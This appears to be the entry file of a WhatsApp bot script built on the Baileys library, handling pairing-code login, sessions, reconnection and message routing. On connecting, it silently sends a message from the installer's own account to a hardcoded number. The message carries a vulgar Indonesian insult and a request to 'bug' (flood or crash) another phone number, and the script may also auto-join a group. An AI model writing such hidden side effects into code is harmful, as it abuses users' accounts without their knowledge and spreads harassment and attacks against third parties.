require("./lib/global")

const func = require("./lib/place")
const readline = require("readline");
const usePairingCode = true
const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
    console.log(chalk.red.bold(`
CiciTzy Imut
Credit Script By AndraZyy
Decrypt Scrypt By CiciTzy
Telegram : @cici_imut
YouTube : @AndraZyy
`))
const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]   
// browser: ['Chrome (Linux)', '', '']
}
const AndraZyy = func.makeWASocket(connectionOptions)
if(usePairingCode && !AndraZyy.authState.creds.registered) {
		const phoneNumber = await question(chalk.green('MASUKKAN NOMOR DENGAN AWALAN KODE NEGARA TANPA SIMBOL +\nCONTOH : 6289526156543\n'));
		const code = await AndraZyy.requestPairingCode(phoneNumber.trim())
		console.log(chalk.green(`enter the code into whatsapp : ${code} `))

	}
store.bind(AndraZyy.ev)

AndraZyy.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
AndraZyy.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
AndraZyy.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
start(`1`, `Connecting...`)
} else if (connection === "open") {
success(`1`, `Tersambung`)
AndraZyy.sendMessage(`62895344043344@s.whatsapp.net`, { text: `najis kontol zero tukang rinem 😂\n
mohon yg udah pake sc ini, tolong bantu bug nomor ini : +62 895-3440-43344\nhttps://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D`})
if (autoJoin) {
AndraZyy.groupAcceptInvite(codeInvite)
}
}
})

AndraZyy.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return AndraZyy.readMessages([m.key])
if (!AndraZyy.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(AndraZyy, m, store)
require("./CiciTzy")(AndraZyy, m, store)
} catch (err) {
console.log(err)
}
})

AndraZyy.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = AndraZyy.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

AndraZyy.public = true

AndraZyy.ev.on('creds.update', saveCreds)
return AndraZyy
}

startSesi()

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
})